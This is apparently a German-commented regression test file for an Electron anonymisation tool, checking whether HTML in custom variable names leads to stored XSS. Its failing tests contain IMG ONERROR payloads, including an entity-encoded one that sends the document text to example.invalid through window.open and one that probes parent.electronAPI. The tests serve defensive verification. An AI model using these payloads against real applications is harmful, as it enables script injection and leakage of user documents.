// S3 App-Test: HTML im Namen einer eigenen Variable. APP=/tmp/triage/v2|v18. Harmlose Marker, externes Oeffnen nur protokolliert (PS_BLOCK_EXTERNAL=1).
import test from 'node:test';
import assert from 'node:assert/strict';
const APP = process.env.APP || '/tmp/triage/v2';
const { launchApp, toolFrame } = await import(APP + '/tests/helpers.mjs');
const ent = (s) => [...s].map((c) => '&#x' + c.charCodeAt(0).toString(16) + ';').join(''); // alle Zeichen als Entitaet (Gross-/Kleinschreibung und Leerzeichen egal)

async function setup() {
  const a = await launchApp({ offline: true });
  const f = await toolFrame(a.win);
  await f.evaluate(() => { try { localStorage.setItem('privacyShield_onboarding_done', 'true'); } catch (e) {} });
  return { a, f };
}
async function addVar(f, name, pat = 'ZZQ\\d{3}') {
  await f.evaluate(({ name, pat }) => { document.getElementById('VN').value = name; document.getElementById('VP').value = pat; addCV(); }, { name, pat });
  await f.waitForTimeout(400);
}

test('S3-1 ROT: <b>TEST</b> als Variablenname erzeugt ein DOM-Element statt woertlichen Text', async () => {
  const { a, f } = await setup();
  try {
    await addVar(f, '<b>test</b>');
    const r = await f.evaluate(() => ({ bCount: document.querySelectorAll('#CVL b').length, text: document.querySelector('#CVL .custom-var-name').textContent }));
    console.log('S3-1', JSON.stringify(r));
    assert.equal(r.bCount, 0, 'es darf kein <b>-Element entstehen');
  } finally { await a.close(); }
});

test('S3-2 ROT: Ereignishandler im Variablennamen laeuft (nur Marker, kein Abfluss)', async () => {
  const { a, f } = await setup();
  try {
    await addVar(f, '<IMG/SRC="X"/ONERROR=PSS3MARK=1>');
    await f.waitForTimeout(500);
    const r = await f.evaluate(() => ({ mark: window.PSS3MARK === 1, imgs: document.querySelectorAll('#CVL img').length }));
    console.log('S3-2', JSON.stringify(r));
    assert.equal(r.mark, false, 'Skript aus dem Namen wurde ausgefuehrt (Marker gesetzt)');
  } finally { await a.close(); }
});

test('S3-3 ROT: Kette Handler -> window.open -> shell.openExternal mit Textdaten (protokolliert, nicht geoeffnet)', async () => {
  const { a, f } = await setup();
  try {
    await f.evaluate(() => { document.getElementById('IT').value = 'SYNTHETISCH-TESTWERT-123'; });
    const js = "window.open('https://example.invalid/ps-s3?d='+encodeURIComponent(document.getElementById('IT').value))";
    await addVar(f, '<IMG/SRC="X"/ONERROR=' + ent(js) + '>');
    await f.waitForTimeout(800);
    const ext = await a.app.evaluate(() => globalThis.__psExternal);
    console.log('S3-3 protokollierte externe Aufrufe:', JSON.stringify(ext));
    assert.deepEqual(ext, [], 'es darf kein externer Aufruf mit Dokumentdaten entstehen');
  } finally { await a.close(); }
});

test('S3-4 ROT: Skript im Namen erreicht parent.electronAPI (gleicher Ursprung app://ps; nur typeof geprueft)', async () => {
  const { a, f } = await setup();
  try {
    const js = "window.PSS3API=typeof parent.electronAPI+':'+typeof parent.electronAPI.copyText+':'+typeof parent.electronAPI.saveFile";
    await addVar(f, '<IMG/SRC="X"/ONERROR=' + ent(js) + '>');
    await f.waitForTimeout(500);
    const v = await f.evaluate(() => window.PSS3API || null);
    console.log('S3-4', v);
    assert.equal(v, null, 'Skript aus dem Namen sieht electronAPI: ' + v);
  } finally { await a.close(); }
});

// Kontrollen (muessen gruen sein): andere Senken mit Nutzer-/Dokumentdaten
test('S3-K1 gruen: Whitelist-Eintrag mit HTML wird maskiert', async () => {
  const { a, f } = await setup();
  try {
    await f.evaluate(() => { document.getElementById('WLI').value = '<IMG/SRC="X"/ONERROR=PSWL=1>'; addWL(); });
    await f.waitForTimeout(400);
    const r = await f.evaluate(() => ({ m: window.PSWL === 1, imgs: document.querySelectorAll('#WLL img').length }));
    assert.deepEqual(r, { m: false, imgs: 0 });
  } finally { await a.close(); }
});
test('S3-K2 gruen: HTML im Muster der Variable (Text und title) bleibt woertlich', async () => {
  const { a, f } = await setup();
  try {
    await addVar(f, 'OK', '"><IMG/SRC="X"/ONERROR=PSPAT=1>ZZ\\d{2}');
    await f.waitForTimeout(500);
    const r = await f.evaluate(() => ({ m: window.PSPAT === 1, imgs: document.querySelectorAll('#CVL img').length, n: document.querySelectorAll('#CVL .custom-var-row').length }));
    console.log('S3-K2', JSON.stringify(r));
    assert.equal(r.m, false); assert.equal(r.imgs, 0);
  } finally { await a.close(); }
});
test('S3-K3 gruen: HTML im Dokumenttext (Hervorhebung, Zuordnungstabelle, Gegenpruefung) bleibt woertlich', async () => {
  const { a, f } = await setup();
  try {
    await addVar(f, 'OK', 'ZZQ\\d{3}');
    const r = await f.evaluate(async () => {
      document.getElementById('IT').value = 'Kontakt ZZQ123 <IMG/SRC="X"/ONERROR=PSDOC=1> und max.muster@example.com <b>fett</b>';
      if (typeof updIC === 'function') updIC();
      if (typeof runHighlight === 'function') runHighlight();
      try { await anon(); } catch (e) {}
      await new Promise((r) => setTimeout(r, 800));
      return { m: window.PSDOC === 1, imgs: document.querySelectorAll('#HLMIRROR img, #MT img, #LCLIST img, #ANOVERLAY img').length, bs: document.querySelectorAll('#HLMIRROR b, #MT b, #LCLIST b').length };
    });
    console.log('S3-K3', JSON.stringify(r));
    assert.deepEqual(r, { m: false, imgs: 0, bs: 0 });
  } finally { await a.close(); }
});
